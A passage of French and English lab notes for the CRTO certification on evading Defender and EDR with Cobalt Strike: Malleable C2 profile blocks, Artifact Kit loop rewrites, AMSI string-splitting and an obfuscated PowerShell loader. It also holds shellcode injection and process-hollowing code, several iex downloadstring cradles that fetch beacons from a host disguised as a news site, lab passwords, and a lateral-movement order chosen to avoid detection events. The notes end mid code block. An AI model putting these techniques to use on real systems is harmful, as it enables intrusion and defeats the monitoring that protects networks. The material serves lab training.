# Lab — Defense Evasion : Malleable C2, Artifact Kit et Resource Kit

> **Objectif :** comprendre les surfaces de détection de Cobalt Strike dans l’environnement CRTO et les paramètres du lab associés au Malleable C2 Profile, à l’Artifact Kit et au Resource Kit.

**Parcours présenté dans les notes :** examiner le profil C2 du team server, les composants Artifact Kit et Resource Kit, les scripts CNA, puis vérifier les comportements sur les machines de formation. Le barème OPSEC doit être confirmé auprès de l’organisme de certification.

---

## Outils SIEM, EDR et antivirus du lab

| Processus | Rôle | Télémétrie possible |
|---|---|---|
| `elastic-agent.exe` | Agent Elastic | Collecte des événements transmis au SIEM |
| `elastic-endpoint.exe` | Protection Elastic Endpoint | Surveillance des processus et comportements |
| `Sysmon64.exe` | Sysmon | Création de processus, threads distants, named pipes |
| `MsMpEng.exe` | Microsoft Defender Antivirus | Analyse de fichiers et de mémoire |
| `NisSrv.exe` | Network Inspection Service de Defender | Analyse de certaines communications réseau |

**Attention :** la télémétrie réellement disponible dépend des politiques d’audit, versions et règles de détection. Il ne faut pas présumer que toutes les actions sont systématiquement journalisées, ni qu’un réglage du profil empêche une détection.

---

## Les différentes couches de détection

| Couche | Moment | Éléments observés | Éléments étudiés dans le lab |
|---|---|---|---|
| **Statique / disque** | Accès ou écriture d’un fichier | En-têtes PE, signatures et octets particuliers | Artifact Kit, `magic_mz` |
| **AMSI** | Traitement de scripts | Contenu des scripts et chaînes de caractères | Resource Kit, templates PowerShell |
| **Mémoire** | Pendant l’exécution | Pages RWX, en-têtes PE et séquences mémoire | Bloc `stage` du profil |
| **Comportement** | Pendant l’activité du processus | Parents/enfants, threads, named pipes | `post-ex` et `process-inject` |
| **Kernel Callbacks** | Création ou manipulation de processus | Image du processus et ligne de commande | Contrôles PPID et exécution |

Réussir un test statique ne signifie pas réussir les contrôles AMSI, mémoire, comportement et réseau.

---

## Rappels — Malware Development Essentials

Le cours s’appuie sur trois modèles d’exécution de shellcode. Leur différence essentielle concerne **l’emplacement d’exécution**, **l’allocation mémoire** et **les appels API** qui deviennent visibles aux mécanismes de sécurité.

### Trois modèles étudiés

| Étape | Modèle | Contexte | Indicateurs potentiels |
|---|---|---|---|
| 1 | Exécution locale | Processus du programme initial | Nouvelle allocation mémoire et démarrage d’un thread |
| 2 | Injection distante | Processus déjà existant | `OpenProcess`, écritures mémoire et threads distants |
| 3 | Process Hollowing | Processus nouvellement créé puis suspendu | `CREATE_SUSPENDED` et `WriteProcessMemory` |

### Exécution locale

```csharp
byte[] buf  = new byte[] { /* shellcode */ };
IntPtr ptr  = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
Marshal.Copy(buf, 0, ptr, buf.Length);
CreateThread(IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, IntPtr.Zero);
```
**Observation EDR :** le lab représente une allocation de mémoire exécutable et le démarrage d’un thread dans un nouveau processus. Une page `PAGE_EXECUTE_READWRITE` peut attirer l’attention des outils de sécurité.

**Paramètre étudié :** `stage.userwx` concerne les permissions mémoire associées au Beacon.

### Injection dans un processus distant

```csharp
IntPtr hProc = OpenProcess(0x001F0FFF, false, targetPid);
IntPtr mem   = VirtualAllocEx(hProc, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
WriteProcessMemory(hProc, mem, buf, (uint)buf.Length, out _);
CreateRemoteThread(hProc, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
```
**Observation EDR :** les appels `VirtualAllocEx`, `WriteProcessMemory` et `CreateRemoteThread` font partie des opérations couramment surveillées pendant l’injection interprocessus.

**Paramètres étudiés :** les options `process-inject.startrwx`, `userwx` et les méthodes `execute` influencent la manière dont Cobalt Strike gère l’allocation et l’exécution.

### Process Hollowing dans le lab Initial Access

```csharp
// Spawn legitimate process in suspended state
CreateProcessA(null, "msedge.exe", null, null, false, CREATE_SUSPENDED, null, null, ref si, out pi);

// Find image base from PEB
NtQueryInformationProcess(pi.hProcess, 0 /*ProcessBasicInformation*/, ref pbi, ...);
ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress + 0x10 /*ImageBaseAddress offset*/, ...);

// Read PE headers to find entry point
ReadProcessMemory(pi.hProcess, imageBase, dosHeader, ...);
// e_lfanew → NT headers → AddressOfEntryPoint

// Overwrite entry point with shellcode
WriteProcessMemory(pi.hProcess, entryPoint, shellcode, shellcode.Length, out _);

// Resume → jumps straight into shellcode, process appears as msedge.exe
ResumeThread(pi.hThread);
```
**Observation EDR :** un processus créé en état suspendu puis modifié en mémoire peut présenter des différences entre son exécutable sur disque et son contenu mémoire.

**Lien avec ce lab :** les paramètres `stage`, `process-inject` et l’Artifact Kit correspondent à des parties différentes de la chaîne d’exécution. Les paramètres doivent être étudiés avec leurs effets observables ; ils n’effacent pas nécessairement les traces.

---

## Partie 1 — Malleable C2 Profile

### Connexion au team server

```bash
ssh attacker@10.0.0.5
# Password: Passw0rd!
cd /opt/cobaltstrike/profiles
nano default.profile
```

---

### Bloc `stage` du Malleable C2 Profile

```
stage {
    set userwx "false";
    set cleanup "true";
    set copy_pe_header "false";
    set module_x64 "Hydrogen.dll";

    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
    }
}
```

**Comprendre les principaux réglages :**

| Réglage | Fonction étudiée | Observation possible |
|---|---|---|
| `userwx "false"` | Gestion des permissions des pages mémoire | Transitions entre permissions RW et RX |
| `cleanup "true"` | Suppression de certains éléments temporaires du chargeur | Modification du contenu mémoire après le chargement |
| `copy_pe_header "false"` | Gestion des en-têtes PE chargés | Visibilité des signatures DOS et NT |
| `module_x64 "Hydrogen.dll"` | Association à un module DLL dans le lab | Correspondance entre fichiers et régions mémoire |

**Bloc `transform-x64 strrep` :** le scénario présente une série de remplacements de chaînes ou d’octets dans la DLL du Beacon. Les exemples comprennent `beacon.x64.dll`, des formats de date, des messages d’état et une séquence hexadécimale.

| Élément de l’exemple | Rôle | Points de contrôle |
|---|---|---|
| `beacon.x64.dll` | Nom présent dans l’exemple de binaire | Chaînes accessibles dans la DLL |
| `%02d/%02d/%02d` | Chaîne de format de date | Format de texte attendu par le programme |
| `%s as %s\\%s: %d` | Format d’un message | Intégrité des chaînes et des sorties |
| Octets `\x48\x89...` | Séquence binaire de référence | Comportement à vérifier après modification |

**Contrainte de format :** une substitution dans une zone de taille fixe doit respecter les limites d’espace prévues par l’outil.

---

### Bloc `post-ex`

```
post-ex {
    set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";
    set cleanup "true";
    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
    set amsi_disable "true";

    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
    }
}
```

**Fonctionnement :** certaines commandes de Cobalt Strike s’exécutent selon le mécanisme fork-and-run : création d’un processus temporaire, chargement du module post-exploitation et récupération de ses résultats, souvent par named pipe.

| Paramètre | Exemple du lab | Fonction |
|---|---|---|
| `spawnto_x64` | `werfault.exe` | Choix du processus temporaire |
| `cleanup` | `true` | Nettoyage d’éléments temporaires après exécution |
| `pipename` | `dotnet-diagnostic-#####` | Modèle de nom de named pipe pour les échanges post-exploitation |
| `thread_hint` | `ntdll.dll!RtlUserThreadStart+0x2c` | Indication associée au point de départ d’un thread |
| `amsi_disable` | `true` | Paramètre relatif au traitement AMSI dans le lab |

**OPSEC :** les noms de processus et de named pipes, les appels mémoire et le comportement du runtime peuvent être visibles indépendamment de ces réglages. Une classification « SAFE » dans le support de formation n’est pas une garantie.

**Chaînes `strrepex` :** le bloc suivant illustre les remplacements de chaînes propres à certains modules post-exploitation.

```
strrepex "<Module>" "<original>" "<replacement>";
# Module = "PowerPick" or "ExecuteAssembly"
```

| Module | Chaîne originale du lab | Exemple de différence étudiée |
|---|---|---|
| `PowerPick` | `CLRCreateInstance failed w/hr 0x%08lx` | Format du message d’erreur |
| `PowerPick` | `Failed to get default AppDomain w/hr 0x%08lx` | Structure de l’erreur CLR |
| `ExecuteAssembly` | `Invoke_3 on EntryPoint failed.` | Message associé au point d’entrée |
| `ExecuteAssembly` | `Failed to load the assembly w/hr 0x%08lx` | Message de chargement de l’assembly |
| Beacon principal | `This program cannot be run in DOS mode.` | Chaîne de l’en-tête DOS |

**Différence :** `strrep` concerne notamment les transformations appliquées au Beacon principal ; `strrepex` cible un module post-exploitation précis dans le contexte du profil.

---

### Bloc `process-inject`

```
process-inject {
    set allocator "VirtualAllocEx";
    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";
    set min_alloc "8192";
    set startrwx "false";
    set userwx "false";

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
    }
}
```

**Objectif :** décrire les paramètres liés à l’allocation mémoire pour les BOF et à l’injection dans un autre processus.

| Paramètre | Rôle |
|---|---|
| `allocator "VirtualAllocEx"` | Allocation mémoire distante |
| `bof_allocator "VirtualAlloc"` | Allocation locale des BOF |
| `bof_reuse_memory "true"` | Réutilisation de certaines zones mémoire |
| `min_alloc "8192"` | Taille minimale d’allocation |
| `startrwx "false"` | Permission de la zone mémoire initiale |
| `userwx "false"` | Permission des pages lors de l’exécution |

### Méthodes `execute`

Le profil du lab présente plusieurs méthodes d’exécution. Elles diffèrent par les API utilisées et les événements potentiellement observables.

| Méthode | Mécanisme |
|---|---|
| `CreateThread` | Création d’un thread |
| `NtQueueApcThread-s` | APC synchrone |
| `NtQueueApcThread` | APC |
| `SetThreadContext` | Modification du contexte d’un thread |

<img src="/images/defence-evasion-lab-01.png" width=1024>

---

### Vérifier le profil et le fonctionnement du team server

```bash
# restart:
sudo /usr/bin/docker restart cobaltstrike-cs-1

# Check logs for profile load errors:
sudo /usr/bin/docker logs cobaltstrike-cs-1
```

> **Dépannage :** les erreurs `[!]` dans les logs Docker peuvent indiquer un problème de syntaxe du profil. Vérifier le fichier chargé et les messages de démarrage du team server avant les tests.

---

## Partie 2 — Artifact Kit

### Rôle de l’Artifact Kit

L’Artifact Kit contient le code source C de plusieurs chargeurs de Cobalt Strike. Les artifacts `.exe`, `.dll` ou `.ps1` peuvent comporter des routines dont la représentation binaire est examinée par des outils antivirus.

Dans le lab, le fichier `patch.c` est utilisé pour étudier le code généré après compilation. Deux versions logiquement proches peuvent produire des séquences d’octets différentes, mais **ce résultat ne suffit pas à démontrer l’absence de détection**.

### Étudier `patch.c` dans Visual Studio Code

```
Launch Visual Studio Code
File > Open Folder → C:\Tools\cobaltstrike\arsenal-kit\kits\artifact
Open: src-common\patch.c
```

**Ligne ~45 :** le cours compare une boucle de traitement dans le binaire de service `svc.exe` et sa représentation après compilation. L’objectif documentaire est d’identifier la correspondance entre code C, opcodes et résultats de ThreatCheck.

```c
// REPLACE WITH (backwards while loop — different compiled bytecode, identical logic):
x = length;
while ( x-- ) {
    * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```

<img src="/images/defence-evasion-lab-04.png" width=1024>

**Ligne ~116 :** un second exemple de boucle figure dans l’exécutable standard du lab.

```c
// REPLACE WITH:
int x = length;
while ( x-- ) {
    * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```

**Interprétation :** deux structures de boucle C peuvent produire des séquences machine différentes malgré une opération logique semblable. Les comparaisons de fichiers doivent être validées par une compilation et des tests reproductibles.

Conserver les versions dans Git pour comparer les résultats ou revenir à un état antérieur.

### Compiler dans Ubuntu WSL

```bash
# Right-click Terminal taskbar icon → Ubuntu WSL
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

# Build:
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

**Paramètres du build Artifact Kit :**

| # | Paramètre | Exemple du lab | Fonction |
|---|---|---|---|
| 1 | `technique` | `mailslot` | Méthode IPC utilisée par l’artifact |
| 2 | `allocator` | `VirtualAlloc` | Méthode d’allocation mémoire |
| 3 | `magic_mz_x86` | `351363` | Paramètre d’en-tête PE x86 |
| 4 | `magic_mz_x64` | `0` | Paramètre d’en-tête PE x64 |
| 5 | `rdll_x86` | `false` | Chargement Reflective DLL x86 |
| 6 | `rdll_x64` | `false` | Chargement Reflective DLL x64 |
| 7 | `stack_spoof` | `none` | Option relative à la pile d’appels |
| 8 | `output_dir` | `/mnt/c/Tools/cobaltstrike/custom-artifacts` | Répertoire de sortie |

### Vérifier le résultat avec ThreatCheck

```cmd
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
```

- **Aucune sortie :** aucune correspondance signalée par ce test précis ; cela ne prouve pas qu’un autre moteur ne détectera pas le fichier.
- **Offset hexadécimal indiqué :** une région du fichier a été signalée et peut être étudiée avec Ghidra.

Documenter les résultats, la version de l’échantillon et la configuration du moteur avant toute comparaison.

### Charger le résultat dans Cobalt Strike

```
Cobalt Strike > Script Manager > Load
→ C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
```

Après chargement de `artifact.cna`, les nouveaux artifacts produits par Cobalt Strike utilisent les composants définis par l’Artifact Kit de l’environnement. Leur comportement doit toujours être vérifié.

<img src="/images/defence-evasion-lab-02.png" width=1024>

---

## Partie 3 — Resource Kit

### Comprendre le Resource Kit

Le Resource Kit contient notamment des **templates PowerShell** utilisés pour certaines fonctions de génération et de livraison de scripts dans Cobalt Strike.

**Pourquoi analyser ces templates ?** AMSI peut inspecter le contenu d’un script avant son exécution. Les chaînes, API et comportements des scripts peuvent être pris en compte par les outils de détection.

### Préparer les templates sous Ubuntu WSL

```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```

La commande du lab copie les fichiers de templates dans le répertoire de sortie. Les fichiers `.ps1` sont des scripts PowerShell : leur traitement ne correspond pas à la compilation d’un exécutable natif C.

### Examiner `template.x64.ps1` dans Visual Studio Code

```
File > Open Folder → C:\Tools\cobaltstrike\custom-resources
Open: template.x64.ps1
```

**Ligne 5 :** le lab compare différentes représentations de la chaîne `System.dll` dans un script PowerShell. Le bloc suivant est conservé comme référence de formation.

```powershell
# Before (AMSI-detected):
.Equals('System.dll')

# After (string concatenation — same runtime result, AMSI misses it):
.Equals('Sys'+'tem.dll')
```

**Analyse :** AMSI peut examiner le texte et le comportement des scripts. Les concaténations de chaînes peuvent produire le même résultat à l’exécution, mais il n’est pas possible de conclure qu’elles empêchent systématiquement une détection.

Le support présente plusieurs variantes de l’exemple `System.dll` et leurs résultats à comparer dans l’environnement du lab.

```powershell
# Option 1 — variable substitution (breaks string-pattern matching entirely):
$s = 'System'; .Equals($s + '.dll')

# Option 2 — character array join:
.Equals([string]::Join('', @('S','y','s','t','e','m','.','d','l','l')))

# Option 3 — format string:
.Equals('{0}.dll' -f 'System')

# Option 4 — base64 decode at runtime (strongest, defeats all string matching):
.Equals([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLmRsbA==')))
# 'U3lzdGVtLmRsbA==' = base64('System.dll')
```

**Contrôle :** relever le résultat de ThreatCheck pour chaque version du template et documenter la version des signatures utilisée. Une absence de détection dans ThreatCheck ne garantit pas un résultat identique en production.

<img src="/images/defence-evasion-lab-03.png" width=1024>

**Ligne 32 :** comparaison entre `Marshal.Copy` et `WriteProcessMemory` dans le code du template PowerShell.

```powershell
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```

**Rôle des API :** `Marshal.Copy` copie des données entre mémoire managée et non managée. `WriteProcessMemory` est une API Windows permettant des écritures mémoire selon les handles et permissions disponibles.

Dans l’exemple du cours, les deux opérations sont étudiées pour comprendre leurs différences de signatures et de télémétrie. Un nom d’API, les appels qui l’utilisent et le contenu du script peuvent tous être analysés par AMSI ou un EDR.

Le cours présente une autre forme d’accès à la même API dans le bloc suivant.

```powershell
# Option 1 — split the API name string (same as System.dll approach):

$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (func_get_proc_address kernel32.dll ('Write'+'ProcessMemory')),
    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool]))
)
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)

# Option 2 — NtWriteVirtualMemory (lower-level ntdll API — less signatured than kernel32 equivalent):

$var_ntwvm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (func_get_proc_address ntdll.dll ('NtWrite'+'VirtualMemory')),
    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([UInt32]))
)
$var_ntwvm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [ref]0) | Out-Null
```

Le lab présente aussi `NtWriteVirtualMemory` comme API apparentée aux opérations d’écriture mémoire. Ces méthodes diffèrent dans leurs chemins d’appel et leurs effets visibles ; leur comportement ne doit pas être considéré comme indétectable.

**Méthode de contrôle :** comparer les versions du script et leurs résultats, puis conserver les différences observées dans les notes.

### Examiner le fichier `compress.ps1`

Cette partie étudie une autre variante du template PowerShell `compress.ps1`, employé pendant la préparation du payload.

```powershell
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```

**Rôle de `compress.ps1` :** le template est utilisé comme enveloppe PowerShell pour des données compressées. Le lab présente une version issue d’Invoke-Obfuscation et compare sa forme textuelle à la version initiale.

<img src="/images/defence-evasion-lab-05.png" width=1024>

**Variable importante :** `%%DATA%%` est un placeholder attendu par le système de génération de Cobalt Strike. Son remplacement incorrect peut rendre le script invalide.

**Observation :** les transformations de tokens, la casse et les chaînes séparées peuvent modifier la forme d’un script sans nécessairement modifier sa logique. Les protections modernes ne se limitent pas aux correspondances de chaînes simples.

### Vérifier le template avec ThreatCheck en mode AMSI

```powershell
cd C:\Tools\cobaltstrike\custom-resources\
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
```

> **Contrôle de qualité :** documenter le résultat exact de l’analyse et la version du fichier testé. Un résultat « No threat found » ne prouve pas l’absence de détection par tous les moteurs de sécurité.

### Charger le Resource Kit dans Cobalt Strike

```
Cobalt Strike > Script Manager > Load
→ C:\Tools\cobaltstrike\custom-resources\resources.cna
```

Les nouveaux scripts générés dans Cobalt Strike peuvent alors utiliser les templates chargés depuis le Resource Kit. Vérifier leur chargement et leur comportement dans l’environnement autorisé.

---

## Partie 4 — Tests du lab

### Comprendre l’en-tête HTTP Host dans le listener

Le listener HTTP du lab utilise la valeur `www.bleepincomputer.com`. Cette section permet de distinguer le nom présenté dans l’en-tête `Host` de l’adresse IP réellement contactée.

```
HTTP Hosts:        www.bleepincomputer.com
HTTP Host (Stager): www.bleepincomputer.com
```

**Principe :** une requête HTTP contient généralement un en-tête `Host:` indiquant l’hôte demandé. Dans Cobalt Strike, le paramètre `HTTP Hosts` du listener influence cette valeur.

La valeur de l’en-tête HTTP ne prouve pas que la connexion réseau est établie avec le domaine indiqué : l’adresse IP de destination, les entrées DNS et la configuration du proxy doivent aussi être vérifiées.

```
Without masquerading:
  Target → TCP connect → 10.0.0.5:80
  HTTP request: GET /heartbeat HTTP/1.1
                Host: 10.0.0.5          ← Raw team server IP in header
                                         ← Network monitoring flags: host C2 on internal IP

With masquerading (www.bleepincomputer.com):
  Target → TCP connect → 10.0.0.5:80
  HTTP request: GET /heartbeat HTTP/1.1
                Host: www.bleepincomputer.com   ← Looks like browsing a legitimate security site
                                                 ← Network monitoring/SIEM sees legitimate-looking traffic
```

### Résolution DNS dans le lab

Le support utilise `www.bleepincomputer.com` comme exemple de nom d’hôte connu. Dans l’environnement de formation décrit, la résolution DNS interne le relie au team server `10.0.0.5`.

**À retenir :** l’en-tête `Host` et l’adresse IP de destination peuvent être différents. C’est une information utile pour la détection réseau ; l’analyse doit corréler DNS, IP, HTTP et processus source.

### Contexte de l’Initial Access

Le lab part d’un scénario **Assume Breach** avec des identifiants fournis et une workstation accessible. La chaîne de livraison par ISO/LNK étudiée dans une autre fiche est un exercice séparé, qui n’est pas nécessaire pour la première session dans ce contexte.

Les contrôles portent principalement sur le chargement des templates Cobalt Strike, le comportement des processus et la visibilité des opérations.

### Vérification du premier Beacon

```
1. Log in to the foothold workstation with provided credentials
2. Open PowerShell
3. Run Scripted Web Delivery payload (team server hosted it when you clicked Launch)
```

```powershell
# Team server is already hosting the PS payload via Scripted Web Delivery
# The URL contains your listener's host value (www.bleepincomputer.com or custom)
iex (new-object net.webclient).downloadstring('http://www.bleepincomputer.com/<uri>')
```

### Identifier les causes possibles d’un blocage

Si un script PowerShell est bloqué, examiner les résultats AMSI, le Resource Kit et la configuration effective du listener. Si l’exécution ne produit pas le résultat attendu, consulter les journaux des processus, les alertes mémoire et le chargement du profil `stage`.

Le lab présente aussi un exécutable de test comme autre format d’artifact. Les résultats des contrôles statiques et des contrôles mémoire doivent être distingués.

```powershell
# Payloads pre-built from lab are at C:\Payloads\ on the Windows dev box
# Copy to target via available file share or CS web delivery, then execute:
.\http_x64.exe
```

Un exécutable produit par l’Artifact Kit reste soumis à l’analyse antivirus ; l’absence d’alerte lors d’un test ne garantit pas la réussite d’un autre essai.

### Contrôler la connexion d’un Beacon de test

```
CS GUI: Attacks > Scripted Web Delivery
Select: http listener → Launch → copy the URL
```

On target (Workstation — PowerShell):

```powershell
iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/a")
```

<img src="/images/defence-evasion-lab-06.png" width=1024>

Switch back to Attacker Desktop — a new beacon should check in.

> If Defender blocks the download: artifact or resource kit still has a signature. Run ThreatCheck
> on the artifact again. If Defender blocks the in-memory execution: stage block settings aren't
> applied or profile didn't reload correctly (check docker logs).

---

### Test lateral movement with custom service spawnto

**`jump psexec64` — OPSEC-🔴UNSAFE. Do NOT use this unless every other path fails.**

`jump psexec64` creates a Windows service on the remote target to execute the beacon payload.
This produces multiple high-confidence detection events simultaneously:

| What it does | Detection event | Event log |
|-------------|----------------|-----------|
| Creates a new service on the remote host | Service Control Manager | Event ID 7045 — "A new service was installed in the system" |
| Authenticates via SMB | Network logon | Event ID 4624 Type 3 + Event ID 4672 (if admin) |
| Writes the service binary to disk | File write to `%SystemRoot%\` or `ADMIN$` | Sysmon Event ID 11 |
| Default artifact is `rundll32.exe` without `ak-settings` | Suspicious service binary | Defender / EDR |
| Service runs, then is immediately deleted | Service create+delete pair | Event ID 7045 + Event ID 7036 |

**Event 7045 is an explicit OPSEC deduction in the exam scoring criteria.** Even with the
`ak-settings` spawnto override, the service creation events still fire — you are only changing
which executable the service runs, not preventing the service from being created.

---

### Lateral Movement — OPSEC Preference Order

**Use the highest-OPSEC option that works. Fall down the list only if the preferred option fails.**

```
1. jump winrm64        OPSEC-🟢SAFE      ← USE THIS FIRST
2. jump scshell64      OPSEC-🟠CAUTION   ← Modifies existing service — no 7045
3. remote-exec wmi     OPSEC-🟠CAUTION   ← No service, no 7045, but WMI process visible
4. jump psexec64       OPSEC-🔴UNSAFE    ← Last resort only — generates Event 7045
```

---

#### Option 1 — `jump winrm64` OPSEC-🟢SAFE

```cs
// Impersonate a local admin on the target first:
beacon> make_token CONTOSO\rsteel Passw0rd!

// Move laterally via WinRM — spawns beacon inside wsmprovhost.exe (legitimate WinRM host process)
// No service created. No Event 7045. No disk write of a service binary.
beacon> jump winrm64 lon-ws-1 smb
```

**What happens:** CS authenticates to the WinRM service (TCP 5985) on the remote host. The
beacon DLL is injected into `wsmprovhost.exe` — the legitimate Windows Remote Management
provider host process. No new service. No file written to disk. Authentication shows as
Event 4624 Type 3 (network logon) — normal for WinRM sessions.

**Requirement:** WinRM must be enabled on the target (default on servers, often disabled on
workstations). Test with `powerpick Test-WSMan <target>` from the source beacon first.

---

#### Option 2 — `jump scshell64` (OPSEC-🟠CAUTION — no Event 7045)

SCShell abuses an existing, already-running service by temporarily modifying its binary path
to execute the beacon, then restoring the original path. No new service is created — no Event 7045.

```cs
// Load the SCShell aggressor script first (one-time):
// CS → Cobalt Strike → Script Manager → Load → C:\Tools\SCShell\CS-BOF\scshell.cna

// Set spawnto for the service binary payload:
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

// Impersonate:
beacon> make_token CONTOSO\rsteel Passw0rd!

// Move laterally:
beacon> jump scshell64 lon-ws-1 smb
```

**What it generates:**
- Service modification events (Event ID 7040 — service binary path changed) — less alarming than 7045
- Beacon lands as SYSTEM inside the modified service process
- If you see error `Advapi32$StartServiceA failed 1056` — service was already running, wait a
  few minutes and retry (SCShell requires the service to be stopped before modification)

**Why it's not SAFE:** Modifying an existing service binary path is still anomalous and visible
to behaviour-based EDR. Quieter than psexec64 but not silent.

---

#### Option 3 — `remote-exec wmi` (OPSEC-🟠CAUTION — no service, no 7045)

WMI process creation via `Win32_Process.Create`. No service involved.

```cs
beacon> make_token CONTOSO\rsteel Passw0rd!

// Execute a command on the remote host via WMI — no beacon spawned automatically
// You need to stage the payload first (e.g. host an exe via CS web server)
beacon> remote-exec wmi lon-ws-1 C:\Windows\Temp\update.exe
```

**Limitation:** `remote-exec wmi` executes a command but does not automatically link a new
beacon back via SMB. You need the payload already on the target (uploaded separately) or
use a PowerShell one-liner via WMI to download and execute. WMI execution is logged via
Event ID 4688 (process creation) and WMI activity log — less noisy than a service but not silent.

> `jump psexec64` (OPSEC-🔴UNSAFE — last resort only)  

<img src="/images/defence-evasion-lab-07.png" width=860>

---

### Lateral Movement Decision Flow

```
Need to move to <target>?
       │
       ▼
Test-WSMan <target> reachable?
  YES → jump winrm64 <target> smb ← stop here, OPSEC-🟢SAFE
  NO  → try scshell64
           │
           ▼
        scshell64 works?
          YES → jump scshell64 <target> smb ← stop here, OPSEC-🟠CAUTION
          NO  → try remote-exec wmi
                    │
                    ▼
                 WMI reachable?
                   YES → remote-exec wmi <target> <staged payload>  ← OPSEC-🟠CAUTION
                   NO  → jump psexec64 <target> smb ← LAST RESORT — accept 7045 event
```

---

## SITREP OPSEC Score

| OPSEC Score Criteria [notes/Exam-Instructions.md](Exam-Instructions.md) | addresses OPSEC |
|----------------------------------------------------|----------------------------------|
| Blocked by Defender / AppLocker | Custom Artifact Kit backward while loop + magic_mz + Resource Kit string obfuscation |
| Default CS indicators pipe names, injection | `post-ex.pipename` = `dotnet-diagnostic-*`, `post-ex.spawnto_x64` = `werfault.exe`, `process-inject` execute block |
| Outbound from unusual processes | `post-ex.spawnto_x64` controls which process handles fork&run (werfault.exe) |
| Suspicious lateral movement | This is separate — prefer `jump winrm64` over `jump psexec64` |

The lab-proven values above are specifically tuned against Windows Defender  
They address every layer Defender uses against CS.  

1. **Run ThreatCheck every time on rebuild.** If CS is updated between new
   signatures may appear. The artifact/resource kit is not a one-time fix — verify clean each time.

2. **ETW 🧠 — driver-bofs is NOT a userland ETW patch.** `C:\Tools\driver-bofs\etw.x64.o`
   patches ETW kernel callbacks and requires a kernel driver already loaded — it will error with
   `Error getting callback offsets` without one. This is a BYOVD/kernel-level kit (CRTO II scope).

   CRTO: the profile's `amsi_disable "true"` in `post-ex` covers AMSI in fork&run
   processes. A separate userland ETW BOF (patching `EtwEventWrite` in ntdll) is the correct
   post-initial-access step if needed, but is **not staged in the lab tools** and is not a primary
   OPSEC scoring criterion. Skip the ETW BOF step unless a userland variant is sourced separately.

   If a userland ETW BOF becomes available:
   ```cs
   beacon> inline-execute C:\path\to\etw_userland.x64.o    // patches EtwEventWrite in ntdll — no driver needed
